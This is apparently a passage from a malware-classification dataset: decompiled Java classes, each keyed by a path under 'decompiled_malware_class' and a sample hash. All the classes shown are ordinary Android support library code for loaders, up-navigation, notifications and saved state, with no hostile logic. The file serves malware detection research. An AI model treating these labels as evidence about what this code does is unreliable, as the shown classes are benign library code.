LoaderInfo li=this.mLoaders.valueAt(i);         writer.print(prefix);         writer.print(""  #"");         writer.print(this.mLoaders.keyAt(i));         writer.print("": "");         writer.println(li.toString());         li.dump(innerPrefix,fd,writer,args);       }     }     if (this.mInactiveLoaders.size() > 0) {       writer.print(prefix);       writer.println(""Inactive Loaders:"");       String innerPrefix2=prefix + ""    "";       for (int i2=0; i2 < this.mInactiveLoaders.size(); i2++) {         LoaderInfo li2=this.mInactiveLoaders.valueAt(i2);         writer.print(prefix);         writer.print(""  #"");         writer.print(this.mInactiveLoaders.keyAt(i2));         writer.print("": "");         writer.println(li2.toString());         li2.dump(innerPrefix2,fd,writer,args);       }     }   }   @Override public boolean hasRunningLoaders(){     boolean loadersRunning=false;     int count=this.mLoaders.size();     for (int i=0; i < count; i++) {       LoaderInfo li=this.mLoaders.valueAt(i);       loadersRunning|=li.mStarted && !li.mDeliveredData;     }     return loadersRunning;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NavUtils.code","public class NavUtils {   private static final NavUtilsImpl IMPL;   public static final String PARENT_ACTIVITY=""android.support.PARENT_ACTIVITY"";   private static final String TAG=""NavUtils""; public interface NavUtilsImpl {     Intent getParentActivityIntent(    Activity activity);     String getParentActivityName(    Context context,    ActivityInfo activityInfo);     void navigateUpTo(    Activity activity,    Intent intent);     boolean shouldUpRecreateTask(    Activity activity,    Intent intent);   } public static class NavUtilsImplBase implements NavUtilsImpl {     NavUtilsImplBase(){     }     @Override public Intent getParentActivityIntent(    Activity activity){       Intent parentIntent=null;       String parentName=NavUtils.getParentActivityName(activity);       if (parentName != null) {         ComponentName target=new ComponentName(activity,parentName);         try {           String grandparent=NavUtils.getParentActivityName(activity,target);           parentIntent=grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);         }  catch (        PackageManager.NameNotFoundException e) {           Log.e(NavUtils.TAG,""getParentActivityIntent: bad parentActivityName '"" + parentName + ""' in manifest"");         }       }       return parentIntent;     }     @Override public boolean shouldUpRecreateTask(    Activity activity,    Intent targetIntent){       String action=activity.getIntent().getAction();       return (action == null || action.equals(""android.intent.action.MAIN"")) ? false : true;     }     @Override public void navigateUpTo(    Activity activity,    Intent upIntent){       upIntent.addFlags(67108864);       activity.startActivity(upIntent);       activity.finish();     }     @Override public String getParentActivityName(    Context context,    ActivityInfo info){       String parentActivity;       if (info.metaData != null && (parentActivity=info.metaData.getString(NavUtils.PARENT_ACTIVITY)) != null) {         if (parentActivity.charAt(0) == '.') {           return context.getPackageName() + parentActivity;         }         return parentActivity;       }       return null;     }   } static class NavUtilsImplJB extends NavUtilsImplBase {     NavUtilsImplJB(){     }     @Override public Intent getParentActivityIntent(    Activity activity){       Intent result=NavUtilsJB.getParentActivityIntent(activity);       if (result == null) {         return superGetParentActivityIntent(activity);       }       return result;     }     Intent superGetParentActivityIntent(    Activity activity){       return super.getParentActivityIntent(activity);     }     @Override public boolean shouldUpRecreateTask(    Activity activity,    Intent targetIntent){       return NavUtilsJB.shouldUpRecreateTask(activity,targetIntent);     }     @Override public void navigateUpTo(    Activity activity,    Intent upIntent){       NavUtilsJB.navigateUpTo(activity,upIntent);     }     @Override public String getParentActivityName(    Context context,    ActivityInfo info){       String result=NavUtilsJB.getParentActivityName(info);       if (result == null) {         return super.getParentActivityName(context,info);       }       return result;     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 16) {       IMPL=new NavUtilsImplJB();     }  else {       IMPL=new NavUtilsImplBase();     }   }   public static boolean shouldUpRecreateTask(  Activity sourceActivity,  Intent targetIntent){     return IMPL.shouldUpRecreateTask(sourceActivity,targetIntent);   }   public static void navigateUpFromSameTask(  Activity sourceActivity){     Intent upIntent=getParentActivityIntent(sourceActivity);     if (upIntent == null) {       throw new IllegalArgumentException(""Activity "" + sourceActivity.getClass().getSimpleName() + "" does not have a parent activity name specified. (Did you forget to add the android.support.PARENT_ACTIVITY <meta-data>  element in your manifest?)"");     }     navigateUpTo(sourceActivity,upIntent);   }   public static void navigateUpTo(  Activity sourceActivity,  Intent upIntent){     IMPL.navigateUpTo(sourceActivity,upIntent);   }   public static Intent getParentActivityIntent(  Activity sourceActivity){     return IMPL.getParentActivityIntent(sourceActivity);   }   public static Intent getParentActivityIntent(  Context context,  Class<?> sourceActivityClass) throws PackageManager.NameNotFoundException {     String parentActivity=getParentActivityName(context,new ComponentName(context,sourceActivityClass));     if (parentActivity == null) {       return null;     }     ComponentName target=new ComponentName(context,parentActivity);     String grandparent=getParentActivityName(context,target);     return grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);   }   public static Intent getParentActivityIntent(  Context context,  ComponentName componentName) throws PackageManager.NameNotFoundException {     String parentActivity=getParentActivityName(context,componentName);     if (parentActivity == null) {       return null;     }     ComponentName target=new ComponentName(componentName.getPackageName(),parentActivity);     String grandparent=getParentActivityName(context,target);     return grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);   }   public static String getParentActivityName(  Activity sourceActivity){     try {       return getParentActivityName(sourceActivity,sourceActivity.getComponentName());     }  catch (    PackageManager.NameNotFoundException e) {       throw new IllegalArgumentException(e);     }   }   public static String getParentActivityName(  Context context,  ComponentName componentName) throws PackageManager.NameNotFoundException {     PackageManager pm=context.getPackageManager();     ActivityInfo info=pm.getActivityInfo(componentName,128);     String parentActivity=IMPL.getParentActivityName(context,info);     return parentActivity;   }   private NavUtils(){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NavUtilsImpl.code","public interface NavUtilsImpl {   Intent getParentActivityIntent(  Activity activity);   String getParentActivityName(  Context context,  ActivityInfo activityInfo);   void navigateUpTo(  Activity activity,  Intent intent);   boolean shouldUpRecreateTask(  Activity activity,  Intent intent); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NavUtilsImplBase.code","public static class NavUtilsImplBase implements NavUtilsImpl {   NavUtilsImplBase(){   }   @Override public Intent getParentActivityIntent(  Activity activity){     Intent parentIntent=null;     String parentName=NavUtils.getParentActivityName(activity);     if (parentName != null) {       ComponentName target=new ComponentName(activity,parentName);       try {         String grandparent=NavUtils.getParentActivityName(activity,target);         parentIntent=grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(NavUtils.TAG,""getParentActivityIntent: bad parentActivityName '"" + parentName + ""' in manifest"");       }     }     return parentIntent;   }   @Override public boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     String action=activity.getIntent().getAction();     return (action == null || action.equals(""android.intent.action.MAIN"")) ? false : true;   }   @Override public void navigateUpTo(  Activity activity,  Intent upIntent){     upIntent.addFlags(67108864);     activity.startActivity(upIntent);     activity.finish();   }   @Override public String getParentActivityName(  Context context,  ActivityInfo info){     String parentActivity;     if (info.metaData != null && (parentActivity=info.metaData.getString(NavUtils.PARENT_ACTIVITY)) != null) {       if (parentActivity.charAt(0) == '.') {         return context.getPackageName() + parentActivity;       }       return parentActivity;     }     return null;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NavUtilsImplJB.code","static class NavUtilsImplJB extends NavUtilsImplBase {   NavUtilsImplJB(){   }   @Override public Intent getParentActivityIntent(  Activity activity){     Intent result=NavUtilsJB.getParentActivityIntent(activity);     if (result == null) {       return superGetParentActivityIntent(activity);     }     return result;   }   Intent superGetParentActivityIntent(  Activity activity){     return super.getParentActivityIntent(activity);   }   @Override public boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     return NavUtilsJB.shouldUpRecreateTask(activity,targetIntent);   }   @Override public void navigateUpTo(  Activity activity,  Intent upIntent){     NavUtilsJB.navigateUpTo(activity,upIntent);   }   @Override public String getParentActivityName(  Context context,  ActivityInfo info){     String result=NavUtilsJB.getParentActivityName(info);     if (result == null) {       return super.getParentActivityName(context,info);     }     return result;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NavUtilsJB.code","class NavUtilsJB {   NavUtilsJB(){   }   public static Intent getParentActivityIntent(  Activity activity){     return activity.getParentActivityIntent();   }   public static boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     return activity.shouldUpRecreateTask(targetIntent);   }   public static void navigateUpTo(  Activity activity,  Intent upIntent){     activity.navigateUpTo(upIntent);   }   public static String getParentActivityName(  ActivityInfo info){     return info.parentActivityName;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NonConfigurationInstances.code","static final class NonConfigurationInstances {   Object activity;   SimpleArrayMap<String,Object> children;   Object custom;   ArrayList<Fragment> fragments;   SimpleArrayMap<String,LoaderManagerImpl> loaders;   NonConfigurationInstances(){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NoSaveStateFrameLayout.code","class NoSaveStateFrameLayout extends FrameLayout {   public static ViewGroup wrap(  View child){     NoSaveStateFrameLayout wrapper=new NoSaveStateFrameLayout(child.getContext());     ViewGroup.LayoutParams childParams=child.getLayoutParams();     if (childParams != null) {       wrapper.setLayoutParams(childParams);     }     FrameLayout.LayoutParams lp=new FrameLayout.LayoutParams(-1,-1);     child.setLayoutParams(lp);     wrapper.addView(child);     return wrapper;   }   public NoSaveStateFrameLayout(  Context context){     super(context);   }   @Override protected void dispatchSaveInstanceState(  SparseArray<Parcelable> container){     dispatchFreezeSelfOnly(container);   }   @Override protected void dispatchRestoreInstanceState(  SparseArray<Parcelable> container){     dispatchThawSelfOnly(container);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NotificationCompat.code","public class NotificationCompat {   public static final int FLAG_HIGH_PRIORITY=128;   private static final NotificationCompatImpl IMPL;   public static final int PRIORITY_DEFAULT=0;   public static final int PRIORITY_HIGH=1;   public static final int PRIORITY_LOW=-1;   public static final int PRIORITY_MAX=2;   public static final int PRIORITY_MIN=-2; public interface NotificationCompatImpl {     Notification build(    Builder builder);   } static class NotificationCompatImplBase implements NotificationCompatImpl {     NotificationCompatImplBase(){     }     @Override public Notification build(    Builder b){       Notification result=b.mNotification;       result.setLatestEventInfo(b.mContext,b.mContentTitle,b.mContentText,b.mContentIntent);       if (b.mPriority > 0) {         result.flags|=128;       }       return result;     }   } static class NotificationCompatImplHoneycomb implements NotificationCompatImpl {     NotificationCompatImplHoneycomb(){     }     @Override public Notification build(    Builder b){       return NotificationCompatHoneycomb.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon);     }   } static class NotificationCompatImplIceCreamSandwich implements NotificationCompatImpl {     NotificationCompatImplIceCreamSandwich(){     }     @Override public Notification build(    Builder b){       return NotificationCompatIceCreamSandwich.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon,b.mProgressMax,b.mProgress,b.mProgressIndeterminate);     }   } static class NotificationCompatImplJellybean implements NotificationCompatImpl {     NotificationCompatImplJellybean(){     }     @Override public Notification build(    Builder b){       NotificationCompatJellybean jbBuilder=new NotificationCompatJellybean(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon,b.mProgressMax,b.mProgress,b.mProgressIndeterminate,b.mUseChronometer,b.mPriority,b.mSubText);       Iterator i$=b.mActions.iterator();       while (i$.hasNext()) {         Action action=i$.next();         jbBuilder.addAction(action.icon,action.title,action.actionIntent);       }       if (b.mStyle != null) {         if (b.mStyle instanceof BigTextStyle) {           BigTextStyle style=(BigTextStyle)b.mStyle;           jbBuilder.addBigTextStyle(style.mBigContentTitle,style.mSummaryTextSet,style.mSummaryText,style.mBigText);         }  else         if (b.mStyle instanceof InboxStyle) {           InboxStyle style2=(InboxStyle)b.mStyle;           jbBuilder.addInboxStyle(style2.mBigContentTitle,style2.mSummaryTextSet,style2.mSummaryText,style2.mTexts);         }  else         if (b.mStyle instanceof BigPictureStyle) {           BigPictureStyle style3=(BigPictureStyle)b.mStyle;           jbBuilder.addBigPictureStyle(style3.mBigContentTitle,style3.mSummaryTextSet,style3.mSummaryText,style3.mPicture,style3.mBigLargeIcon,style3.mBigLargeIconSet);         }       }       return jbBuilder.build();     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new NotificationCompatImplJellybean();       return;     }     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new NotificationCompatImplIceCreamSandwich();     }  else     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new NotificationCompatImplHoneycomb();     }  else {       IMPL=new NotificationCompatImplBase();     }   } public static class Builder {     CharSequence mContentInfo;     PendingIntent mContentIntent;     CharSequence mContentText;     CharSequence mContentTitle;     Context mContext;     PendingIntent mFullScreenIntent;     Bitmap mLargeIcon;     int mNumber;     int mPriority;     int mProgress;     boolean mProgressIndeterminate;     int mProgressMax;     Style mStyle;     CharSequence mSubText;     RemoteViews mTickerView;     boolean mUseChronometer;     ArrayList<Action> mActions=new ArrayList<>();     Notification mNotification=new Notification();     public Builder(    Context context){       this.mContext=context;       this.mNotification.when=System.currentTimeMillis();       this.mNotification.audioStreamType=-1;       this.mPriority=0;     }     public Builder setWhen(    long when){       this.mNotification.when=when;       return this;     }     public Builder setUsesChronometer(    boolean b){       this.mUseChronometer=b;       return this;     }     public Builder setSmallIcon(    int icon){       this.mNotification.icon=icon;       return this;     }     public Builder setSmallIcon(    int icon,    int level){       this.mNotification.icon=icon;       this.mNotification.iconLevel=level;       return this;     }     public Builder setContentTitle(    CharSequence title){       this.mContentTitle=title;       return this;     }     public Builder setContentText(    CharSequence text){       this.mContentText=text;       return this;     }     public Builder setSubText(    CharSequence text){       this.mSubText=text;       return this;     }     public Builder setNumber(    int number){       this.mNumber=number;       return this;     }     public Builder setContentInfo(    CharSequence info){       this.mContentInfo=info;       return this;     }     public Builder setProgress(    int max,    int progress,    boolean indeterminate){       this.mProgressMax=max;       this.mProgress=progress;       this.mProgressIndeterminate=indeterminate;       return this;     }     public Builder setContent(    RemoteViews views){       this.mNotification.contentView=views;       return this;     }     public Builder setContentIntent(    PendingIntent intent){       this.mContentIntent=intent;       return this;     }     public Builder setDeleteIntent(    PendingIntent intent){       this.mNotification.deleteIntent=intent;       return this;     }     public Builder setFullScreenIntent(    PendingIntent intent,    boolean highPriority){       this.mFullScreenIntent=intent;       setFlag(128,highPriority);       return this;     }     public Builder setTicker(    CharSequence tickerText){       this.mNotification.tickerText=tickerText;       return this;     }     public Builder setTicker(    CharSequence tickerText,    RemoteViews views){       this.mNotification.tickerText=tickerText;       this.mTickerView=views;       return this;     }     public Builder setLargeIcon(    Bitmap icon){       this.mLargeIcon=icon;       return this;     }     public Builder setSound(    Uri sound){       this.mNotification.sound=sound;       this.mNotification.audioStreamType=-1;       return this;     }     public Builder setSound(    Uri sound,    int streamType){       this.mNotification.sound=sound;       this.mNotification.audioStreamType=streamType;       return this;     }     public Builder setVibrate(    long[] pattern){       this.mNotification.vibrate=pattern;       return this;     }     public Builder setLights(    int argb,    int onMs,    int offMs){       this.mNotification.ledARGB=argb;       this.mNotification.ledOnMS=onMs;       this.mNotification.ledOffMS=offMs;       boolean showLights=(this.mNotification.ledOnMS == 0 || this.mNotification.ledOffMS == 0) ? false : true;       this.mNotification.flags=(showLights ? 1 : 0) | (this.mNotification.flags & (-2));       return this;     }     public Builder setOngoing(    boolean ongoing){       setFlag(2,ongoing);       return this;     }     public Builder setOnlyAlertOnce(    boolean onlyAlertOnce){       setFlag(8,onlyAlertOnce);       return this;     }     public Builder setAutoCancel(    boolean autoCancel){       setFlag(16,autoCancel);       return this;     }     public Builder setDefaults(    int defaults){       this.mNotification.defaults=defaults;       if ((defaults & 4) != 0) {         this.mNotification.flags|=1;       }       return this;     }     private void setFlag(    int mask,    boolean value){       if (value) {         this.mNotification.flags|=mask;       }  else {         this.mNotification.flags&=mask ^ (-1);       }     }     public Builder setPriority(    int pri){       this.mPriority=pri;       return this;     }     public Builder addAction(    int icon,    CharSequence title,    PendingIntent intent){       this.mActions.add(new Action(icon,title,intent));       return this;     }     public Builder setStyle(    Style style){       if (this.mStyle != style) {         this.mStyle=style;         if (this.mStyle != null) {           this.mStyle.setBuilder(this);         }       }       return this;     }     @Deprecated public Notification getNotification(){       return NotificationCompat.IMPL.build(this);     }     public Notification build(){       return NotificationCompat.IMPL.build(this);     }   } public static abstract class Style {     CharSequence mBigContentTitle;     Builder mBuilder;     CharSequence mSummaryText;     boolean mSummaryTextSet=false;     public void setBuilder(    Builder builder){       if (this.mBuilder != builder) {         this.mBuilder=builder;         if (this.mBuilder != null) {           this.mBuilder.setStyle(this);         }       }     }     public Notification build(){       if (this.mBuilder == null) {         return null;       }       Notification notification=this.mBuilder.build();       return notification;     }   } public static class BigPictureStyle extends Style {     Bitmap mBigLargeIcon;     boolean mBigLargeIconSet;     Bitmap mPicture;     public BigPictureStyle(){     }     public BigPictureStyle(    Builder builder){       setBuilder(builder);     }     public BigPictureStyle setBigContentTitle(    CharSequence title){       this.mBigContentTitle=title;       return this;     }     public BigPictureStyle setSummaryText(    CharSequence cs){       this.mSummaryText=cs;       this.mSummaryTextSet=true;       return this;     }     public BigPictureStyle bigPicture(    Bitmap b){       this.mPicture=b;       return this;     }     public BigPictureStyle bigLargeIcon(    Bitmap b){       this.mBigLargeIcon=b;       this.mBigLargeIconSet=true;       return this;     }   } public static class BigTextStyle extends Style {     CharSequence mBigText;     public BigTextStyle(){     }     public BigTextStyle(    Builder builder){       setBuilder(builder);     }     public BigTextStyle setBigContentTitle(    CharSequence title){       this.mBigContentTitle=title;       return this;     }     public BigTextStyle setSummaryText(    CharSequence cs){       this.mSummaryText=cs;       this.mSummaryTextSet=true;       return this;     }     public BigTextStyle bigText(    CharSequence cs){       this.mBigText=cs;       return this;     }   } public static class InboxStyle extends Style {     ArrayList<CharSequence> mTexts=new ArrayList<>();     public InboxStyle(){     }     public InboxStyle(    Builder builder){       setBuilder(builder);     }     public InboxStyle setBigContentTitle(    CharSequence title){       this.mBigContentTitle=title;       return this;     }     public InboxStyle setSummaryText(    CharSequence cs){       this.mSummaryText=cs;       this.mSummaryTextSet=true;       return this;     }     public InboxStyle addLine(    CharSequence cs){       this.mTexts.add(cs);       return this;     }   } public static class Action {     public PendingIntent actionIntent;     public int icon;     public CharSequence title;     public Action(    int icon_,    CharSequence title_,    PendingIntent intent_){       this.icon=icon_;       this.title=title_;       this.actionIntent=intent_;     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NotificationCompatHoneycomb.code","class NotificationCompatHoneycomb {   NotificationCompatHoneycomb(){   }   public static Notification add(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon){     Notification.Builder b=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number);     return b.getNotification();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NotificationCompatIceCreamSandwich.code","class NotificationCompatIceCreamSandwich {   NotificationCompatIceCreamSandwich(){   }   public static Notification add(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon,  int mProgressMax,  int mProgress,  boolean mProgressIndeterminate){     Notification.Builder b=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number).setProgress(mProgressMax,mProgress,mProgressIndeterminate);     return b.getNotification();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NotificationCompatImpl.code","public interface NotificationCompatImpl {   Notification build(  Builder builder); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NotificationCompatImplBase.code","static class NotificationCompatImplBase implements NotificationCompatImpl {   NotificationCompatImplBase(){   }   @Override public Notification build(  Builder b){     Notification result=b.mNotification;     result.setLatestEventInfo(b.mContext,b.mContentTitle,b.mContentText,b.mContentIntent);     if (b.mPriority > 0) {       result.flags|=128;     }     return result;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NotificationCompatImplHoneycomb.code","static class NotificationCompatImplHoneycomb implements NotificationCompatImpl {   NotificationCompatImplHoneycomb(){   }   @Override public Notification build(  Builder b){     return NotificationCompatHoneycomb.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NotificationCompatImplIceCreamSandwich.code","static class NotificationCompatImplIceCreamSandwich implements NotificationCompatImpl {   NotificationCompatImplIceCreamSandwich(){   }   @Override public Notification build(  Builder b){     return NotificationCompatIceCreamSandwich.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon,b.mProgressMax,b.mProgress,b.mProgressIndeterminate);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NotificationCompatImplJellybean.code","static class NotificationCompatImplJellybean implements NotificationCompatImpl {   NotificationCompatImplJellybean(){   }   @Override public Notification build(  Builder b){     NotificationCompatJellybean jbBuilder=new NotificationCompatJellybean(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon,b.mProgressMax,b.mProgress,b.mProgressIndeterminate,b.mUseChronometer,b.mPriority,b.mSubText);     Iterator i$=b.mActions.iterator();     while (i$.hasNext()) {       Action action=i$.next();       jbBuilder.addAction(action.icon,action.title,action.actionIntent);     }     if (b.mStyle != null) {       if (b.mStyle instanceof BigTextStyle) {         BigTextStyle style=(BigTextStyle)b.mStyle;         jbBuilder.addBigTextStyle(style.mBigContentTitle,style.mSummaryTextSet,style.mSummaryText,style.mBigText);       }  else       if (b.mStyle instanceof InboxStyle) {         InboxStyle style2=(InboxStyle)b.mStyle;         jbBuilder.addInboxStyle(style2.mBigContentTitle,style2.mSummaryTextSet,style2.mSummaryText,style2.mTexts);       }  else       if (b.mStyle instanceof BigPictureStyle) {         BigPictureStyle style3=(BigPictureStyle)b.mStyle;         jbBuilder.addBigPictureStyle(style3.mBigContentTitle,style3.mSummaryTextSet,style3.mSummaryText,style3.mPicture,style3.mBigLargeIcon,style3.mBigLargeIconSet);       }     }     return jbBuilder.build();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\NotificationCompatJellybean.code","class NotificationCompatJellybean {   private Notification.Builder b;   public NotificationCompatJellybean(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon,  int mProgressMax,  int mProgress,  boolean mProgressIndeterminate,  boolean useChronometer,  int priority,  CharSequence subText){     this.b=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setSubText(subText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number).setUsesChronometer(useChronometer).setPriority(priority).setProgress(mProgressMax,mProgress,mProgressIndeterminate);   }   public void addAction(  int icon,  CharSequence title,  PendingIntent intent){     this.b.addAction(icon,title,intent);   }   public void addBigTextStyle(  CharSequence bigContentTitle,  boolean useSummary,  CharSequence summaryText,  CharSequence bigText){     Notification.BigTextStyle style=new Notification.BigTextStyle(this.b).setBigContentTitle(bigContentTitle).bigText(bigText);     if (useSummary) {       style.setSummaryText(summaryText);     }   }   public void addBigPictureStyle(  CharSequence bigContentTitle,  boolean useSummary,  CharSequence summaryText,  Bitmap bigPicture,  Bitmap bigLargeIcon,  boolean bigLargeIconSet){     Notification.BigPictureStyle style=new Notification.BigPictureStyle(this.b).setBigContentTitle(bigContentTitle).bigPicture(bigPicture);     if (bigLargeIconSet) {       style.bigLargeIcon(bigLargeIcon);     }     if (useSummary) {       style.setSummaryText(summaryText);     }   }   public void addInboxStyle(  CharSequence bigContentTitle,  boolean useSummary,  CharSequence summaryText,  ArrayList<CharSequence> texts){     Notification.InboxStyle style=new Notification.InboxStyle(this.b).setBigContentTitle(bigContentTitle);     if (useSummary) {       style.setSummaryText(summaryText);     }     Iterator i$=texts.iterator();     while (i$.hasNext()) {       CharSequence text=i$.next();       style.addLine(text);     }   }   public Notification build(){     return this.b.build();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\OnBackStackChangedListener.code","public interface OnBackStackChangedListener {   void onBackStackChanged(); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\Op.code","public static final class Op {   int cmd;   int enterAnim;   int exitAnim;   Fragment fragment;   Op next;   int popEnterAnim;   int popExitAnim;   Op prev;   ArrayList<Fragment> removed; } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\SavedState.code","public static class SavedState implements Parcelable {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in){       return new SavedState(in,null);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   final Bundle mState;   public SavedState(  Bundle state){     this.mState=state;   }   SavedState(  Parcel in,  ClassLoader loader){     this.mState=in.readBundle();     if (loader != null && this.mState != null) {       this.mState.setClassLoader(loader);     }   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeBundle(this.mState);   } } public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in){       return new SavedState(in);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   String curTab;   SavedState(  Parcelable superState){     super(superState);   }   private SavedState(  Parcel in){     super(in);     this.curTab=in.readString();   }   @Override public void writeToParcel(  Parcel out,  int flags){     super.writeToParcel(out,flags);     out.writeString(this.curTab);   }   public String toString(){     return ""FragmentTabHost.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" curTab=""+ this.curTab+ ""}"";   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ServiceCompat.code","public class ServiceCompat {   public static final int START_STICKY=1;   private ServiceCompat(){   } } "
